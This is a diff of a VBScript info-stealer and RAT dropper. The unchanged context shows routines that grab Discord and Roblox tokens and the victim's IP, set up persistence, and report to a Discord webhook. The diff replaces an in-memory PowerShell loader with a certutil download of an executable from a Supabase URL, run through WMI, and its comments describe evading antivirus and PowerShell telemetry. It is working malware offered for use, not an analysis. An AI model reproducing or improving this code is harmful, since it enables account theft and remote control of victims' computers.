@@ -15,10 +15,6 @@ WH = "https://discordapp.com/api/webhooks/1564329308187529359/eFrj6tXHLM0bU-Qz_2
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' TRACE
-Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\trace.txt"
-Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf: tr.Close: Set tr = Nothing
-
 ' --- Initial Grab ---
 Call GrabTokens
 Call IP
@@ -26,13 +22,8 @@ Call GrabRoblox
 Call Persistence
 Call GrabFroststrap
 
-' --- Download & Execute RAT 2 Times ---
-Dim downloadAttempt
-For downloadAttempt = 1 To 2
-    Call PostEmbed(":arrows_counterclockwise: Download Attempt " & downloadAttempt & "/2", "PC: " & PC & " | User: " & USER, 3447003)
-    Call DropRAT
-    If downloadAttempt < 2 Then Call SleepMinutes(2)
-Next
+' --- Download & Execute RAT ---
+Call DropRAT
 
 ' --- Re-run grab chain 4x (every 5 min) ---
 Dim runCount
@@ -146,45 +137,39 @@ Sub GrabFroststrap()
     sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
 End Sub
 
-' --- DropRAT (In-Memory Execution Bypass) ---
+' --- DropRAT (Certutil Download & WMI Execution) ---
 Sub DropRAT()
     Call PostEmbed(":package: RAT Download", "Fetching Payload...", 3447003)
     
-    ' UPDATE THIS LINK TO YOUR SUPABASE OR GITHUB URL
+    ' REPLACE WITH YOUR ACTUAL SUPABASE OR PERMANENT LINK
     Dim dl : dl = "https://uqmzwiaidvfokyfxzolb.supabase.co/storage/v1/object/public/DiscordUpdater/DiscordUpdater.exe"
+    Dim op : op = sh.ExpandEnvironmentStrings("%APPDATA%") & "\SysCache.exe"
     
-    ' We will download the exe into memory and execute it without writing to disk
-    ' The Base64 string is decoded in memory and loaded as an assembly
-    Dim psCmd
-    psCmd = "$url = '" & dl & "'; " & _
-            "$wc = New-Object System.Net.WebClient; " & _
-            "$data = $wc.DownloadData($url); " & _
-            "$ms = New-Object System.IO.MemoryStream(,$data); " & _
-            "$asm = [System.Reflection.Assembly]::Load($ms.ToArray()); " & _
-            "$asm.EntryPoint.Invoke($null, $null)"
-            
-    ' Run the command, redirecting output to null
-    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command """ & psCmd & """", 0, False
-    
-    Call PostEmbed(":white_check_mark: RAT", "Payload executed in memory.", 65280)
+    If fso.FileExists(op) Then fso.DeleteFile op
+
+    ' 1. Download using certutil (bypasses some PowerShell telemetry)
+    sh.Run "cmd /c certutil -urlcache -split -f """ & dl & """ """ & op & """ > nul 2>&1", 0, True
+
+    ' 2. Check if downloaded
+    If fso.FileExists(op) And fso.GetFile(op).Size > 3000000 Then
+        Call PostEmbed(":rocket: RAT Downloaded", "Size: " & fso.GetFile(op).Size & " bytes", 3447003)
+        
+        ' 3. Execute using WMI (hides the command line from basic AV)
+        Dim wmi, process
+        Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+        Set process = wmi.Get("Win32_Process")
+        process.Create op, Null, Null, Null
+        
+        Call PostEmbed(":white_check_mark: RAT", "Payload executed successfully", 65280)
+    Else
+        Call PostEmbed(":hourglass: RAT Timeout", "Download failed or file too small.", 16711680)
+    End If
 End Sub
 
-' --- Sleep Functions (Timer-Based) ---
+' --- Sleep Functions ---
 Sub SleepSeconds(s)
-    Dim t0, t1, t2, elapsed
-    t0 = Timer()
     Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
     sh.Run cmd, 0, True
-    elapsed = Timer() - t0
-    If elapsed < 0 Then elapsed = elapsed + 86400
-    If elapsed < s Then
-        t1 = Timer()
-        Do
-            t2 = Timer()
-            If t2 < t1 Then t2 = t2 + 86400
-            If (t2 - t1) >= (s - elapsed) Then Exit Do
-        Loop
-    End If
 End Sub
 
 Sub SleepMinutes(m)
